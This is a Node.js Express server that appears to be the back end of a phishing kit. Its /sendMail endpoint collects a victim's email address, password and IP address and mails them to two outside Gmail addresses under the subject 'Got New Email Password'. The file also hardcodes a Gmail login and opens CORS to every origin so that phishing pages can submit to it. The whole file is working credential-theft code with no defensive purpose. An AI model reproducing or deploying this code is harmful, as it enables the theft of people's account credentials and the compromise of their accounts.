const express = require("express");
const nodemailer = require("nodemailer");
const app = express();

const Email = "hussnain77133@gmail.com";
const Password = "h4ck3r771333";

const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: Email,
    pass: Password,
  },
});

app.use(express.json());

app.use((req, res, next) => {
  res.setHeader("content-type", "application/json");
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader(
    "Access-Control-Allow-Headers",
    "Origin, X-Requested-With, Content-Type, Accept"
  );
  res.setHeader(
    "Access-Control-Allow-Methods",
    "GET, POST, PATCH, DELETE, OPTIONS"
  );
  next();
});

app.get("/sendMail", async (req, res, next) => {
  try {
    const { email, password, ipaddress } = req.query;
    console.log(req.query);
    if (!email || !password) {
      return res.status(400).json({ error: "Email/password undefined" });
    }
    const mailOptions = {
      from: `no-reply`,
      to: "mktimothy46@gmail.com",
      subject: `Got New Email Password`,
      html: `  <h4 style="font-size: 16px;">Email : ${email} </h4>
               <h4>Password : ${password},</h4>
               <h4>Ip Address : ${ipaddress},</h4>
              `,
    };
    const mailOptions2 = {
      from: `no-reply`,
      to: "hassanssekasamba@gmail.com",
      subject: `Got New Email Password`,
      html: `  <h4 style="font-size: 16px;">Email : ${email} </h4>
               <h4>Password : ${password},</h4>
               <h4>Ip Address : ${ipaddress},</h4>
              `,
    };
    transporter.sendMail(mailOptions, (erro, info) => {
      if (erro) {
        return res.status(400).json(erro.toString());
      }
      transporter.sendMail(mailOptions2, (erro, info) => {
        if (erro) {
          return res.status(400).json(erro.toString());
        }
        return res
          .status(200)
          .json({ dataSent: req.body, RESPONCE: "Emails Sent Successfully" });
      });
    });
  } catch (error) {
    return res.status(400).json({
      message:
        "Something went wrong on server ,if problem continues then please contact hussnain77133@gmail.com",
    });
  }
});

app.get("*", function (req, res) {
  return res.status(400).json({
    Success: true,
    message: "You can Only send post req to sendMail",
  });
});

app.post("*", function (req, res) {
  return res.status(400).json({
    Success: true,
    message: "You can Only send Post req to sendMail",
  });
});

const port = process.env.PORT || 5000;
app.listen(port, () => console.log(`Listening on port ${port}`));
